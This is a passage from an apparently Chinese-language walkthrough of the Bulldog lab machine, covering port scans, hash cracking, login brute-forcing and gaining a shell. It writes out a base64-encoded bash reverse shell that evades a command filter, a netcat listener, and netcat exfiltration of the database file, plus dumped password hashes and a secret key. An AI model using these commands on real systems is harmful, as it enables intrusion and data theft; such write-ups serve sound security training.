class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.123<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 02:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00032s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.48 seconds<br></code></pre></td></tr></table></figure><p>开放了 23,80,8080 端口，DUP 端口扫描结果没有特别需要注意的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p23,80,8080 192.168.56.123               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 23:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00035s latency).<br><br>PORT     STATE SERVICE VERSION<br>23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:8b:<span class="hljs-built_in">fc</span>:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)<br>|   256 <span class="hljs-built_in">cd</span>:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)<br>|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)<br>80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)<br>|_http-title: Bulldog Industries<br>8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)<br>|_http-title: Bulldog Industries<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.33 seconds<br></code></pre></td></tr></table></figure><p>这里可以判断出 23 端口是 ssh 端口，80 和 8080 端口似乎网页标题和搭建方式都是相同的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo nmap --script=vuln -p23,80,8080 192.168.56.123<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 01:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00035s latency).<br><br>PORT     STATE SERVICE<br>23/tcp   open  telnet<br>80/tcp   open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-fileupload-exploiter: </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|_  /dev/: Potentially interesting folder</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|   /robots.txt: Robots file<br>|_  /dev/: Potentially interesting folder<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br></code></pre></td></tr></table></figure><p>看到 80 和 8080 端口枚举的结果也是相同的</p><h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p>接下来先只看 80 端口进行网页查看</p><p><img src="/pic/31494dcd9babc79f5099992bed51edde_MD5.png"></p><p>80 端口的网页中，网站建立者说明了一件事：遭受了攻击，给了个公开说明的链接</p><p><img src="/pic/c61cff90c1dad4f47d787d64a3f6a484_MD5.png"></p><p>说明中透漏了一些信息：黑客通过 shell 连接后使用脏牛漏洞进行提权，和一个用户名 <code>Churchy</code>。之前 nmap 枚举出了一些目录或者文件，进行查看，同时开启 dirsearch 目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sudo dirsearch -u http://192.168.56.123        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.123/_23-07-03_01-45-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-03_01-45-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.123/<br><br>[01:45:30] Starting: <br>[01:45:37] 301 -    0B  - /admin  -&gt;  http://192.168.56.123/admin/          <br>[01:45:37] 302 -    0B  - /admin/  -&gt;  http://192.168.56.123/admin/login/?next=/admin/<br>[01:45:37] 302 -    0B  - /admin/?/login  -&gt;  http://192.168.56.123/admin/login/?next=/admin/%3F/login<br>[01:45:38] 301 -    0B  - /admin/login  -&gt;  http://192.168.56.123/admin/login/<br>[01:45:46] 301 -    0B  - /dev  -&gt;  http://192.168.56.123/dev/              <br>[01:45:46] 200 -    3KB - /dev/                                             <br>[01:45:58] 200 -    1KB - /robots.txt                                  <br>Task Completed<br></code></pre></td></tr></table></figure><p><img src="/pic/a0a69b13836033d8755fffa92f05f1d4_MD5.png"></p><p>robots.txt 中是个黑客攻破后留下的团队的标志，那 dev 目录呢</p><p><img src="/pic/cc8579ececf613f0e2d658038bf7746e_MD5.png"></p><p>给了更详细的信息，归纳一下：这应该是开发者团队对新员工的说明和培训，PHP 被移除了服务器，不会用流行度很高的 cms 和管理工具，而是用自己开发的工具。有个 webshell 的接口以后会取代 ssh 连接，MongoDB 还没有被安装好，公司买了个新的入侵检测系统，还给了个 webshell 的链接</p><p><img src="/pic/212092fea2c922f66fd14c4469802e9f_MD5.png"></p><p>点进去提示没有经过验证，看一看开发团队网页的源代码</p><p><img src="/pic/b61417fadb8c3083b49431a857d12d5e_MD5.png"></p><p>哈希值竟然直接写在了里面，使用在线工具破解吧</p><p><img src="/pic/49f2ccc7082fe7c2f115256696e7682e_MD5.png"></p><p><img src="/pic/845bc5b3f4839aa992a598a86d3c3a29_MD5.png"></p><p>有两个用户的密码碰撞了出来，<code>sarah:bulldoglover</code> 和 <code>nick:bulldog</code> 尝试 ssh 登录但是失败。</p><blockquote><p>实际上这里我一开始只使用控制台看了一眼折叠起来的源码，没有直接查看网页源代码，所以在这里卡了很久，针对下方的登录界面尝试了一些 Django 的漏洞，包括 <a href="https://github.com/HxDDD/CVE-PoC/tree/main/Django">CVE-PoC&#x2F;Django at main · HxDDD&#x2F;CVE-PoC · GitHub</a> 中的三个，但是都没有成功。所以使用 burp suite 的 Cluster bomb 模式来爆破，用户名就是刚才页面里邮箱的用户名，密码使用的是 burp suite 的默认密码列表，得到了 <code>nick:bulldog</code> 这样一对登录凭证</p></blockquote><p><img src="/pic/cc73d1c9c1e38394ad29a9340fcb90c9_MD5.png"></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>回到目录扫描的结果，其中有登录的 URL</p><p><img src="/pic/2ff3d029daefbf132405c3b63366e414_MD5.png"></p><p>尝试用上面两个用户进行登录，nick:bulldog 登录成功，但是界面却提示没有权限编辑任何东西</p><p><img src="/pic/0fb2d933d6055be7bb26f1a8eb271641_MD5.png"></p><p>那这里似乎突破口不是很明显，回到&#x2F;dev 目录看看呢，竟然有了个 webshell 的界面</p><p><img src="/pic/8ca00b968be6098658a4b9188a9e85b1_MD5.png"></p><h3 id="编码-Getshell"><a href="#编码-Getshell" class="headerlink" title="编码 Getshell"></a>编码 Getshell</h3><p>尝试了一下，发现有简单的过滤，whoami,bash 等命令被过滤了，那就 base64 编码后再执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/443 0&gt;&amp;1&quot;&#x27;</span> |<span class="hljs-built_in">base64</span><br>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYx<br>          <br>┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYxIgo=&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/443 0&gt;&amp;1&quot;</span><br><br></code></pre></td></tr></table></figure><p>根据上方结果，构造出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQ0MyAwPiYxIgo=&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>提前开启监听，然后再网页中执行</p><p><img src="/pic/2dc0ea36b2cc64e82d17d6dc9ebf2019_MD5.png"></p><p>成功反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.123] 48748<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (976): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>bash: /root/.bashrc: Permission denied<br>django@bulldog:/home/django/bulldog<span class="hljs-variable">$whoami</span><br><span class="hljs-built_in">whoami</span><br>django<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(django) gid=1001(django) <span class="hljs-built_in">groups</span>=1001(django),27(sudo)<br>django@bulldog:/home/django/bulldog$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>确定目标反弹成功，并且知道了内核版本号，接下来完善一下 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>&lt;/bulldog$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>                     <br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>bash: /root/.bashrc: Permission denied<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>那先看看当前目录下有什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bulldog  db.sqlite3  manage.py<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">cat</span> manage.py<br><span class="hljs-built_in">cat</span> manage.py<br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.environ.setdefault(<span class="hljs-string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="hljs-string">&quot;bulldog.settings&quot;</span>)<br><br>    from django.core.management import execute_from_command_line<br><br>    execute_from_command_line(sys.argv)<br></code></pre></td></tr></table></figure><p>有个 db.sqlite3 文件，将其通过 nc 发送到攻击机上，攻击机使用 <code>sudo nc -lv -p 333 &gt; db.sqlite3</code>，靶机使用 <code>nc -nv 192.168.56.106 333 &lt; db.sqlite3</code> 来发送文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ nc -nv 192.168.56.106 333 &lt; db.sqlite3<br>nc -nv 192.168.56.106 333 &lt; db.sqlite3<br>Connection to 192.168.56.106 333 port [tcp/*] succeeded!<br></code></pre></td></tr></table></figure><h3 id="sqlite3-数据库文件查看"><a href="#sqlite3-数据库文件查看" class="headerlink" title="sqlite3 数据库文件查看"></a>sqlite3 数据库文件查看</h3><p>这里搜了下 sqlite3 数据库文件如何查看</p><ul><li>sqlite3+文件名打开文件</li><li>.tables 查看所有的表</li><li>.schema 查看表结构</li><li>select * from 表名;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sqlite3 db.sqlite3  <br>SQLite version 3.40.1 2022-12-28 14:03:47<br>Enter <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> usage hints.<br>sqlite&gt;.tables<br>auth_group                  auth_user_user_permissions<br>auth_group_permissions      django_admin_log          <br>auth_permission             django_content_type       <br>auth_user                   django_migrations         <br>auth_user_groups            django_session<br>sqlite&gt; <span class="hljs-keyword">select</span> * from auth_user;<br>1|pbkdf2_sha256$20000$9k0TYJltYWk5<span class="hljs-variable">$rE0aQA4DGFxEjBhBH0BEJhFsF2Jx63690a8VGE</span>/9a+c=|1|admin|||admin@bulldogindustries.com|1|1|2017-08-18 22:42:27.888865|2017-08-19 06:14:22.419010<br>3|pbkdf2_sha256$20000$AvMG3SPMFdWk<span class="hljs-variable">$br74kiJcinPLKkqG</span>+i9G+2MavMVW9IXDl2TSeQ5My+A=|0|alan||||1|1|2017-08-19 05:57:32|<br>4|pbkdf2_sha256$20000$LgCCwZ1qFhSK<span class="hljs-variable">$xv2NHkto76GEp11lXNUFPsiolvoV8c8R</span>/PRl2/XccX0=|0|william||||1|1|2017-08-19 06:02:07|<br>5|pbkdf2_sha256$20000$IjvfpwWo8tw9<span class="hljs-variable">$9PZgYsZCcRz3dLVU</span>/4TnXa9i2VcybBnBedCyNjk3Sak=|0|malik||||1|1|2017-08-19 06:02:50|<br>6|pbkdf2_sha256$20000$ooicdWHyxlTk<span class="hljs-variable">$oNMBAZDKarihoPIzzYAhDq</span>+4cR8JtJGt9JQIA8q1SX8=|0|kevin||||1|1|2017-08-19 06:03:22|<br>7|pbkdf2_sha256$20000$nmdkvhu3yqa9<span class="hljs-variable">$8VSo44h9fXYj6FLavolYDZ7P5PhFBLeKBmLkBlNpGTk</span>=|0|ashley||||1|1|2017-08-19 06:04:18|<br>8|pbkdf2_sha256$20000$QFeEaqreqK8o<span class="hljs-variable">$ldGl5qhFnyB</span>+tFrOflSwxSGO3Xt/mL4sjBiCPyPusU4=|0|nick||||1|1|2017-08-19 06:06:08|2023-07-03 07:32:15.318467<br>9|pbkdf2_sha256$20000$lA6iOt4XGXLw<span class="hljs-variable">$0VHpbYjNiFN4CnHisuB</span>+bFh72A6sn03Q+d34Laj7jkM=|0|sarah||||1|1|2017-08-19 06:06:56|<br>sqlite&gt; <span class="hljs-keyword">select</span> * from auth_permission;<br>1|1|add_logentry|Can add <span class="hljs-built_in">log</span> entry<br>2|1|change_logentry|Can change <span class="hljs-built_in">log</span> entry<br>3|1|delete_logentry|Can delete <span class="hljs-built_in">log</span> entry<br>4|2|add_permission|Can add permission<br>5|2|change_permission|Can change permission<br>6|2|delete_permission|Can delete permission<br>7|3|add_group|Can add group<br>8|3|change_group|Can change group<br>9|3|delete_group|Can delete group<br>10|4|add_user|Can add user<br>11|4|change_user|Can change user<br>12|4|delete_user|Can delete user<br>13|5|add_contenttype|Can add content <span class="hljs-built_in">type</span><br>14|5|change_contenttype|Can change content <span class="hljs-built_in">type</span><br>15|5|delete_contenttype|Can delete content <span class="hljs-built_in">type</span><br>16|6|add_session|Can add session<br>17|6|change_session|Can change session<br>18|6|delete_session|Can delete session<br>sqlite&gt; <span class="hljs-keyword">select</span> * from django_admin_log;<br>1|2017-08-18 22:44:28.935362|2|alan|1||4|1<br>2|2017-08-19 05:52:32.978087|2|alan|3||4|1<br>3|2017-08-19 05:57:32.723768|3|alan|1||4|1<br>4|2017-08-19 06:02:07.988633|4|william|1||4|1<br>5|2017-08-19 06:02:50.604910|5|malik|1||4|1<br>6|2017-08-19 06:03:22.814721|6|kevin|1||4|1<br>7|2017-08-19 06:04:18.210702|7|ashley|1||4|1<br>8|2017-08-19 06:06:08.629082|8|nick|1||4|1<br>9|2017-08-19 06:06:56.356511|9|sarah|1||4|1<br>10|2017-08-19 06:13:55.722525|8|nick|2|Changed password.|4|1<br>11|2017-08-19 06:14:50.804394|3|alan|2|Changed is_staff.|4|1<br>12|2017-08-19 06:14:57.811418|7|ashley|2|Changed is_staff.|4|1<br>13|2017-08-19 06:15:08.187751|6|kevin|2|Changed is_staff.|4|1<br>14|2017-08-19 06:15:18.199899|5|malik|2|Changed is_staff.|4|1<br>15|2017-08-19 06:15:25.607889|8|nick|2|Changed is_staff.|4|1<br>16|2017-08-19 06:15:32.692866|9|sarah|2|Changed is_staff.|4|1<br>17|2017-08-19 06:15:42.247879|4|william|2|Changed is_staff.|4|1<br></code></pre></td></tr></table></figure></li></ul><p>翻看了一下，密码是经过 pbkdf2_sha256 哈希的，碰撞难度较大，只能算是拿到了一些用户名。回到刚才的 shell 中，继续进行信息收集，在当前目录的子目录下，找到一个 settings.py 文件，其中有个 secret_key，但是搜索了一下似乎没法用来提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog/bulldog$ <span class="hljs-built_in">cat</span> settings.py<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Django settings for bulldog project.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Generated by &#x27;django-admin startproject&#x27; using Django 1.8.7.</span><br><span class="hljs-string"></span><br><span class="hljs-string">For more information on this file, see</span><br><span class="hljs-string">https://docs.djangoproject.com/en/1.8/topics/settings/</span><br><span class="hljs-string"></span><br><span class="hljs-string">For the full list of settings and their values, see</span><br><span class="hljs-string">https://docs.djangoproject.com/en/1.8/ref/settings/</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># Build paths inside the project like this: os.path.join(BASE_DIR, ...)</span><br>import os<br><br>BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))<br><br><br><span class="hljs-comment"># Quick-start development settings - unsuitable for production</span><br><span class="hljs-comment"># See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/</span><br><br><span class="hljs-comment"># SECURITY WARNING: keep the secret key used in production secret!</span><br>SECRET_KEY = <span class="hljs-string">&#x27;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;u+o_g$yi83d*riq&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="定时任务和SUID"><a href="#定时任务和SUID" class="headerlink" title="定时任务和SUID"></a>定时任务和SUID</h3><p>看看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the 